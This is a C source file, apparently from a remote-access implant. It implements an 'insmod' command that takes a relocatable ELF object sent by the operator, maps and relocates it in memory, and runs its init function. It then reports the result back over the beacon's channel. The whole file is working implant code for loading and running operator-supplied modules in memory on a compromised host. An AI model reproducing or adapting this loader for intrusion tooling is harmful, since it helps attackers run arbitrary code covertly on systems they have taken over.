#include "command_insmod.h"
#include "elf_parser.h"
#include "module.h"

#if defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__)
#define INTERNAL_DEFAULT_LIBRARY ((void*) -2)
#else
#define INTERNAL_DEFAULT_LIBRARY NULL//RTLD_DEFAULT
#endif

static int load_module(BEACONINFO *beaconInfo,char *mod_data,int mod_size,char *mod_name,char *err_str,int err_str_max_len)
{
    ELFInfo_t elfinfo;
    int retcode = 0;
    int counter = 0;
    int tempOffsetCounter = 0;
    int c2 = 0;
    int mod_init_retval;
    char *elf_format_data = NULL;

    struct module *mod = NULL;
    module_init module_init_func = NULL;
    module_exit module_exit_func = NULL;
    module_run  module_run_func  = NULL;

    elf_format_data = malloc(mod_size);
    if(elf_format_data == NULL){
        DLX(6,printf("\talloc module data error\n"));
        retcode = -ENOMEM;
        goto cleanup;
    }
    memcpy(elf_format_data,mod_data,mod_size);

    memset(&elfinfo,0,sizeof(elfinfo));
    elfinfo.Header = (Elf_Ehdr*)elf_format_data;
    if(find_module(mod_name) != NULL){
        DLX(6,printf("\tmodule already exist\n"));
        snprintf(err_str,err_str_max_len-1,"%s","module already exist");
        retcode = -E_MOD_EXIST;
        goto cleanup;
    }

    // varify that the data is an elf file
    if( elf_format_data[0] != '\x7f' || elf_format_data[1] != 'E' || elf_format_data[2] != 'L' || elf_format_data[3] != 'F' ){
        DLX(6,printf("\tnot an elf file\n"));
        snprintf(err_str,err_str_max_len-1,"%s","not an elf file");
        retcode = -E_INVAL_MOD_FMT;
        goto cleanup;
    }
    DLX(6,printf("\tvalid elf file magic number\n"));

    if(elfinfo.Header->e_type != ET_REL){ //ET_DYN
        DLX(6,printf("\tELF Type isn't Shared object file type\n"));
        snprintf(err_str,err_str_max_len-1,"%s","ELF Type isn't Shared object file type");
        retcode = -E_INVAL_MOD_TYPE;
        goto cleanup;
    }
    //.so .elf(pie)
    DLX(6,printf("\tELF Object Data: %p\n", elf_format_data));
    DLX(6,printf("\tELF Type: %d\n", elfinfo.Header->e_type));
    DLX(6,printf("\tELF Machine: %d\n", elfinfo.Header->e_machine));
    DLX(6,printf("\tELF Version: %d\n", elfinfo.Header->e_version));
    DLX(6,printf("\tELF Entry: 0x%lx\n", elfinfo.Header->e_entry));
    DLX(6,printf("\tELF ProgramHeaderOffset: 0x%lx\n", elfinfo.Header->e_phoff));
    DLX(6,printf("\tELF SectionHeaderOffset: 0x%lx\n", elfinfo.Header->e_shoff));
    DLX(6,printf("\tELF Flags: 0x%x\n", elfinfo.Header->e_flags));
    DLX(6,printf("\tELF Header Size: %d\n", elfinfo.Header->e_ehsize));
    DLX(6,printf("\tELF Program Header Entry Size: %d\n", elfinfo.Header->e_phentsize));
    DLX(6,printf("\tELF Program Header Entry Count: %d\n", elfinfo.Header->e_phnum));
    DLX(6,printf("\tELF Section Header Entry Size: %d\n", elfinfo.Header->e_shentsize));
    DLX(6,printf("\tELF Section Header Entry Count: %d\n", elfinfo.Header->e_shnum));
    DLX(6,printf("\tELF Section Header Table Index Entry: %d\n", elfinfo.Header->e_shstrndx));

    /* Set all the headers and sizes */
    elfinfo.progHeader = (Elf_Phdr*)(elf_format_data + elfinfo.Header->e_phoff);
    elfinfo.sectHeader = (Elf_Shdr*)(elf_format_data + elfinfo.Header->e_shoff);
    elfinfo.progHeaderNum = elfinfo.Header->e_phnum;
    elfinfo.sectHeaderNum = elfinfo.Header->e_shnum;

    DLX(6,printf("\tWorking with program headers, Count: %d\n", elfinfo.progHeaderNum));
    for (counter = 0; counter < elfinfo.progHeaderNum; counter++){
        DLX(6,printf("\t\tProgram Header Entry Counter: %d\n", counter));
        DLX(6,printf("\t\tOffset: 0x%lx\n", elfinfo.progHeader[counter].p_offset));
    }

    elfinfo.sectionMappings = calloc(elfinfo.sectHeaderNum*sizeof(char*), 1);
    elfinfo.sectionMappingProts = calloc(elfinfo.sectHeaderNum*sizeof(int), 1);
    if (elfinfo.sectionMappings == NULL || elfinfo.sectionMappingProts == NULL){
        DLX(6,printf("Failed to setup sectionMappings\n"));
        retcode = -ENOMEM;
        goto cleanup;
    }
    elfinfo.tempOffsetTable = mmap(NULL, 255*ThunkTrampolineSize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    tempOffsetCounter += 0x5000;
    elfinfo.tempOffsetCounter = 0;
    if (elfinfo.tempOffsetTable == NULL || elfinfo.tempOffsetTable == (void*)-1){
        DLX(6,printf("Failed to allocate the hacky GOT/Thunk function table.\n"));
        retcode = -ENOMEM;
        goto cleanup;
    }

    DLX(6,printf("\tWorking over section headers, Count: %d\n", elfinfo.sectHeaderNum));
    for (counter = 0; counter < elfinfo.sectHeaderNum; counter++){
        int sectionProts = PROT_READ | PROT_WRITE;

        DLX(6,printf("\tSection Header Entry Counter: %d\n", counter));
        DLX(6,printf("\t\tName is %d\n", elfinfo.sectHeader[counter].sh_name));
        DLX(6,printf("\t\tType is 0x%x\n", elfinfo.sectHeader[counter].sh_type));
        DLX(6,printf("\t\tFlags are 0x%lx\n", elfinfo.sectHeader[counter].sh_flags));
        
        /* Identify the memory permissions here */
        if (elfinfo.sectHeader[counter].sh_flags & SHF_WRITE){
            DLX(6,printf("\t\tWriteable Section\n"));
            sectionProts = PROT_READ | PROT_WRITE;
        }
        if (elfinfo.sectHeader[counter].sh_flags & SHF_EXECINSTR){
            DLX(6,printf("\t\tExecutable Section\n"));
            sectionProts = PROT_READ | PROT_EXEC;
        }
        if (elfinfo.sectHeader[counter].sh_size > 0 && elfinfo.sectHeader[counter].sh_type == SHT_PROGBITS){
            elfinfo.sectionMappings[counter] = mmap(elfinfo.tempOffsetTable+tempOffsetCounter, elfinfo.sectHeader[counter].sh_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            tempOffsetCounter += 0x5000;
            if (elfinfo.sectionMappings[counter] == NULL || elfinfo.sectionMappings[counter] == (void*)-1){
                DLX(6,printf("\t\tFailed to allocate memory for section\n"));
                retcode = -ENOMEM;
                goto cleanup;
            }
            memcpy(elfinfo.sectionMappings[counter], elf_format_data+elfinfo.sectHeader[counter].sh_offset, elfinfo.sectHeader[counter].sh_size);
        }else{
        /* Not allocating memory because the section isn't needed for the program to run, just used to link. */
            DLX(6,printf("\t\tNot allocating memory for section\n"));
            elfinfo.sectionMappings[counter] = NULL;
        }
        elfinfo.sectionMappingProts[counter] = sectionProts;

        DLX(6,printf("\t\tAddr is 0x%lx\n", elfinfo.sectHeader[counter].sh_addr));
        DLX(6,printf("\t\tOffset is 0x%lx\n", elfinfo.sectHeader[counter].sh_offset));
        DLX(6,printf("\t\tSize is %ld\n", elfinfo.sectHeader[counter].sh_size));
        DLX(6,printf("\t\tLink is %d\n", elfinfo.sectHeader[counter].sh_link));
        DLX(6,printf("\t\tInfo is %d\n", elfinfo.sectHeader[counter].sh_info));
        DLX(6,printf("\t\tAddrAlign is %ld\n", elfinfo.sectHeader[counter].sh_addralign));
        DLX(6,printf("\t\tEntSize is %ld\n", elfinfo.sectHeader[counter].sh_entsize));

        /* Locate the sections that we want to keep track to */
        switch (elfinfo.sectHeader[counter].sh_type){
            case SHT_SYMTAB:
                DLX(6,printf("\t\tSymbol Table\n"));
                elfinfo.symbolTable = (Elf_Sym*)(elf_format_data + elfinfo.sectHeader[counter].sh_offset);
                elfinfo.stringTable = (char*)(elf_format_data + elfinfo.sectHeader[elfinfo.sectHeader[counter].sh_link].sh_offset);
                DLX(6,printf("\t\tSymbolTable: %p\n", elfinfo.symbolTable));
                DLX(6,printf("\t\tStringTable: %p\n", elfinfo.stringTable));
                break;
            case SHT_STRTAB:
                DLX(6,printf("\t\tString Table\n"));
                elfinfo.sectionStringTable = (char*)(elf_format_data + elfinfo.sectHeader[counter].sh_offset);
                break;
            default:
                DLX(6,printf("\t\tCase Not Handled\n"));
                break;
        }
    }

    DLX(6,printf("\tWorking over section headers, Round 2, Count: %d\n", elfinfo.sectHeaderNum));
    for (counter = 0; counter < elfinfo.sectHeaderNum; counter++){
        DLX(6,printf("\tSection Header Entry Counter: %d\n", counter));
        char* sym = elfinfo.sectionStringTable + elfinfo.sectHeader[counter].sh_name;
        DLX(6,printf("\t\tName is %s\n", sym));
        Elf_Rel* rel = (Elf_Rel*)(elf_format_data + elfinfo.sectHeader[counter].sh_offset);
        DLX(6,printf("\t\tType is 0x%x\n", elfinfo.sectHeader[counter].sh_type));
        DLX(6,printf("\t\tFlags are 0x%lx\n", elfinfo.sectHeader[counter].sh_flags));
        DLX(6,printf("\t\tAddr is 0x%lx\n", elfinfo.sectHeader[counter].sh_addr));
        DLX(6,printf("\t\tOffset is 0x%lx\n", elfinfo.sectHeader[counter].sh_offset));
        DLX(6,printf("\t\tSize is %ld\n", elfinfo.sectHeader[counter].sh_size));
        DLX(6,printf("\t\tLink is %d\n", elfinfo.sectHeader[counter].sh_link));
        DLX(6,printf("\t\tInfo is %d\n", elfinfo.sectHeader[counter].sh_info));
        DLX(6,printf("\t\tAddrAlign is %ld\n", elfinfo.sectHeader[counter].sh_addralign));
        DLX(6,printf("\t\tEntSize is %ld\n", elfinfo.sectHeader[counter].sh_entsize));

        /* Handle the relocations here */
        if (elfinfo.sectHeader[counter].sh_type == SHT_REL_TYPE){
            DLX(6,printf("\t\tRelocation Entries:\n"));
            for (c2 = 0; c2 < elfinfo.sectHeader[counter].sh_size / sizeof(Elf_Rel); c2++){
                char* relocStr = elfinfo.stringTable + elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_name;
                char WorkingTrampoline[ThunkTrampolineSize];
                memcpy(WorkingTrampoline, ThunkTrampoline, ThunkTrampolineSize);
                DLX(6,printf("\t\t\tSymbol: %s\n", relocStr));
                DLX(6,printf("\t\t\tType: 0x%lx\n", ELF_R_TYPE(rel[c2].r_info)));
                DLX(6,printf("\t\t\tSymbolValue: 0x%lx\n", elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_value));
                /* This is the section number where the relocation lives in at x + offset, if its 0 then its a symbol to get
                 * so get the address, store the address, increase the symbol count, and then continue */
                DLX(6,printf("\t\t\tShndx: 0x%x\n", elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx));
                if (elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx == 0){
                    /* This function is a function not defined in the object file, so if we can't resolve it then bail. */
                    void* symaddress = NULL;
                    int32_t relativeOffsetFunc = 0;
                    symaddress = internalFunctionLookup(relocStr);
                    if (symaddress == NULL){
                        DLX(6,printf("\t\t\t\tFailed to find a function!!!!!\n"));
                        snprintf(err_str,err_str_max_len-1,"Failed to find a function:%s",relocStr);
                        retcode = -E_MOD_FUNC_LOOK;
                        goto cleanup;
                    }
                    DLX(6,printf("\t\t\t\tFound Function Address: %p\n", symaddress));
                    /* Copy over the symaddress to the location of the trampoline */
                    memcpy(WorkingTrampoline+THUNKOFFSET, &symaddress, sizeof(void*));
                    /* Copy the trampoline bytes over to the tempOffsetTable so relocations work */
                    DLX(6,printf("\t\t\t\tTempOffsetCounter: %d\n", elfinfo.tempOffsetCounter));
                    memcpy(elfinfo.tempOffsetTable+(elfinfo.tempOffsetCounter*ThunkTrampolineSize), WorkingTrampoline, ThunkTrampolineSize);
                    /* Calculate the relative offset of the function trampoline */
                    /* The logic to handle x86_64 is different then x86, so ifdef'ing these out for now */
                   #if defined(__amd64__) || defined(__x86_64__)
                    relativeOffsetFunc = (elfinfo.tempOffsetTable + (elfinfo.tempOffsetCounter *ThunkTrampolineSize))-(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset)+rel[c2].r_addend;
                    DLX(6,printf("\t\t\t\tRelativeOffsetFunc: 0x%x\n", relativeOffsetFunc));
                    /* Copy over the relative offset to the trampoline table */
                    memcpy(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset, &relativeOffsetFunc, 4);
                    #elif defined(__i386__)
                    /* Need to correct this for x86 and 32 bit arm targets, think its good now. */
                    memcpy(&relativeOffsetFunc, elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset, 4);
                    relativeOffsetFunc += (elfinfo.tempOffsetTable + (elfinfo.tempOffsetCounter *ThunkTrampolineSize))-(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset);
                    memcpy(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset, &relativeOffsetFunc, 4);
                    #else
                    DLX(6,printf("\t\t\t\tTERROR: Not configured for this architecture\n"));
                    #endif
                    /* Once set increment the Thunk Trampoline counter to the next one */
                    elfinfo.tempOffsetCounter+=1;
                }
                else if (elfinfo.sectHeader[counter].sh_flags== SHF_INFO_LINK){/* `sh_info' contains SHT index */
                    /* Handle the relocations for values and functions included in the object file */
                    /* NOTE: If sh_flags == 0x40, then sh_info contains the section the relocation applies too */
                    #if defined(__amd64__) || defined(__x86_64__)
                    int32_t relativeOffset = (elfinfo.sectionMappings[elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx])-(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset)+rel[c2].r_addend + elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_value;
                    #elif defined(__i386__)
                    int32_t relativeOffset = 0;
                    if (ELF_R_TYPE(rel[c2].r_info) == R_386_32){
                        DLX(6,printf("\t\t\t\t32bit Direct\n"));
                        memcpy(&relativeOffset, elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset, 4);
                        //relativeOffset = (elfinfo.sectionMappings[elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx])-(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset)+relativeOffset + elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_value;
                        relativeOffset += elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_value;
                        relativeOffset += (int32_t)(elfinfo.sectionMappings[elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx]);
                    }
                    else if (ELF_R_TYPE(rel[c2].r_info) == R_386_PC32){
                        DLX(6,printf("\t\t\t\tPC relative Address\n"));
                        memcpy(&relativeOffset, elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset, 4);
                        relativeOffset = (elfinfo.sectionMappings[elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx])-(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset)+relativeOffset + elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_value;
                    }
                    #else
                    int32_t relativeOffset = 0;
                    #endif
                    DLX(6,printf("\t\t\t\tFirstAddress(NoAddend): %p\n", (elfinfo.sectionMappings[elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx])));

                    #if defined(__amd64__) || defined(__x86_64__)
                    DLX(6,printf("\t\t\t\tFirstAddress: %p\n", (elfinfo.sectionMappings[elfinfo.symbolTable[ELF_R_SYM(rel[c2].r_info)].st_shndx]+rel[c2].r_addend)));
                    #endif
                    DLX(6,printf("\t\t\t\tSecondAddress(NoOffset): %p\n", (elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info])));
                    DLX(6,printf("\t\t\t\tSecondAddress: %p\n", (elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset)));
                    DLX(6,printf("\t\t\t\tRelativeOffset: 0x%x\n", relativeOffset));
                    /* Copy over the relative offset of the value to the section+offset */
                    memcpy(elfinfo.sectionMappings[elfinfo.sectHeader[counter].sh_info]+rel[c2].r_offset, &relativeOffset, 4);
                }
                DLX(6,printf("\t\t\tOffset: 0x%lx\n", rel[c2].r_offset));
                #if defined(__amd64__) || defined(__x86_64__)
                DLX(6,printf("\t\t\tAddend: 0x%lx\n", rel[c2].r_addend));
                #endif
                DLX(6,printf("\t\t\t----------------------------------------------------------\n"));
            }
        }
        /* Handle the symbols here, get the entry point and all that */
        if (elfinfo.sectHeader[counter].sh_type == SHT_SYMTAB){
            for (c2 = 0; c2 < elfinfo.sectHeader[counter].sh_size / sizeof(Elf_Sym); c2 += 1) {
                Elf_Sym* syms = (Elf_Sym*)(elf_format_data + elfinfo.sectHeader[counter].sh_offset);
                //DLX(0,printf("\t\t\t0x%x\n", syms[c2].st_name));
                DLX(6,printf("\t\t\tSymbolName: %s\n", elfinfo.stringTable + syms[c2].st_name));
                
                
                if(strcmp(MODULE_INIT_FUNC_NAME,elfinfo.stringTable + syms[c2].st_name) == 0){
                    DLX(6,printf("\t\t\tFOUND module_init function!\n"));
                    module_init_func = (module_init)elfinfo.sectionMappings[syms[c2].st_shndx] + syms[c2].st_value;
                }
                else if(strcmp(MODULE_EXIT_FUNC_NAME,elfinfo.stringTable + syms[c2].st_name) == 0){
                    DLX(6,printf("\t\t\tFOUND module_exit function!\n"));
                    module_exit_func = (module_exit)elfinfo.sectionMappings[syms[c2].st_shndx] + syms[c2].st_value;
                }
                else if(strcmp(MODULE_RUN_FUNC_NAME,elfinfo.stringTable + syms[c2].st_name) == 0){
                    DLX(6,printf("\t\t\tFOUND module_run function!\n"));
                    module_run_func = (module_run)elfinfo.sectionMappings[syms[c2].st_shndx] + syms[c2].st_value;
                }
                

                DLX(6,printf("\t\t\tSymbolSectionIndex: %d\n", syms[c2].st_shndx));
                if (elfinfo.sectionMappings != NULL && syms[c2].st_shndx < elfinfo.sectHeaderNum && syms[c2].st_shndx != 0){
                    DLX(6,printf("\t\t\tSymbolAddress(real): %p\n", elfinfo.sectionMappings[syms[c2].st_shndx] + syms[c2].st_value));
                }
            }
        }
    }
    DLX(6,printf("\tTempOffsetTable: %p\n", elfinfo.tempOffsetTable));
    if (mprotect(elfinfo.tempOffsetTable, 255*ThunkTrampolineSize, PROT_READ | PROT_EXEC) != 0){
        DLX(6,printf("\tFailed to mprotect the thunk table\n"));
    }
    
    for (counter = 0; counter < elfinfo.sectHeaderNum; counter++){
        DLX(6,printf("\tSection #%d mapped at %p\n", counter, elfinfo.sectionMappings[counter]));
        if (elfinfo.sectionMappings[counter] != NULL){
            if (mprotect(elfinfo.sectionMappings[counter], elfinfo.sectHeader[counter].sh_size, elfinfo.sectionMappingProts[counter]) != 0){
                DLX(6,printf("\tFailed to protect memory\n"));
            }
        }
    }

    if(module_init_func  == NULL){
        DLX(6,printf("\tNot found module init function\n"));
        snprintf(err_str,err_str_max_len-1,"%s","Not found module init function");
        retcode = -E_MOD_INIT_FUNC_LOOK;
        goto cleanup;
    }
    if(module_exit_func  == NULL){
        DLX(6,printf("\tNot found module exit function\n"));
        snprintf(err_str,err_str_max_len-1,"%s","Not found module exit function");
        retcode = -E_MOD_EXIT_FUNC_LOOK;
        goto cleanup;
    }
    if(module_run_func  == NULL){
        DLX(6,printf("\tNot found module run function\n"));
        snprintf(err_str,err_str_max_len-1,"%s","Not found module run function");
        retcode = -E_MOD_RUN_FUNC_LOOK;
        goto cleanup;
    }

    mod = malloc(sizeof(struct module));
    if(mod == NULL){
        DLX(6,printf("\talloc module struct error\n"));
        retcode = -ENOMEM;
        goto cleanup;
    }
    memset(mod,0,sizeof(struct module));
    mod->elfinfo = elfinfo;
    mod->module_init_func = module_init_func;
    mod->module_exit_func = module_exit_func;
    mod->module_run_func  = module_run_func;
    mod->module_is_running = 0;
    mod->beaconInfo = beaconInfo;

    snprintf(mod->name,MODULE_NAME_LENGTH,"%s",mod_name);

    if( (mod_init_retval = exec_mod_init_function(mod)) != 0 ){
        DLX(6,printf("\tmodule init function return error\n"));
        snprintf(err_str,err_str_max_len-1,"module init function return error(retval:%d)",mod_init_retval);
        retcode = -E_MOD_INIT_FUNC_EXEC;
        goto cleanup;
    }

    add_module(mod);
    return retcode;

cleanup:
    DLX(6,printf("\tCleaning up...\n"));
    for (counter = 0; counter < elfinfo.sectHeaderNum; counter++){
        DLX(6,printf("\tFreeing Section #%d\n", counter));
        if (elfinfo.sectionMappings != NULL){
            if (elfinfo.sectionMappings[counter] != NULL){
                if (munmap(elfinfo.sectionMappings[counter], elfinfo.sectHeader[counter].sh_size)  != 0){
                    DLX(6,printf("\tFailed to unmap memory\n"));
                }
            }
        }
    }
    if (elfinfo.tempOffsetTable){
        munmap(elfinfo.tempOffsetTable, 255*ThunkTrampolineSize);
    }

    if (elfinfo.sectionMappings){
        free(elfinfo.sectionMappings);
    }
    if (elfinfo.sectionMappingProts){
        free(elfinfo.sectionMappingProts);
    }
    if(mod){
        free(mod);
    }
    if(elf_format_data){
        free(elf_format_data);
    }

    DLX(6,printf("\tReturning\n"));
    return retcode;
}

static struct beaconModuleExecResult *beaconModuleResultCreate(void)
{
    struct beaconModuleExecResult *ret = NULL;
    
    ret = malloc(sizeof(struct beaconModuleExecResult));
    if (ret == NULL)
    {
        DLX(7, printf("\tAlloc beaconModuleResultError\n"));
        return ret;
    }

    memset(ret, 0, sizeof(struct beaconModuleExecResult));

    return ret;
}

int command_insmod(BEACONINFO *beaconInfo, char *mod_name,char *mod_data,int mod_size)
{
    struct packet_struct *packet = packet_create(COMMAND_INSMOD);
    char err_str[4096] = {0};
    int retcode;
    int err_strlen = 0;

    packet_add_uint32(packet, strlen(mod_name));
    packet_add_bytes(packet, mod_name, strlen(mod_name));

    retcode = load_module(beaconInfo,mod_data,mod_size,mod_name,err_str,4096);
    err_strlen = strlen(err_str);
    packet_add_uint32(packet, retcode);
    packet_add_uint32(packet, err_strlen);

    if(err_strlen != 0){
        packet_add_bytes(packet,err_str,err_strlen);
    }

transmit:
    packet_transmit(beaconInfo, packet);
    return 0;
}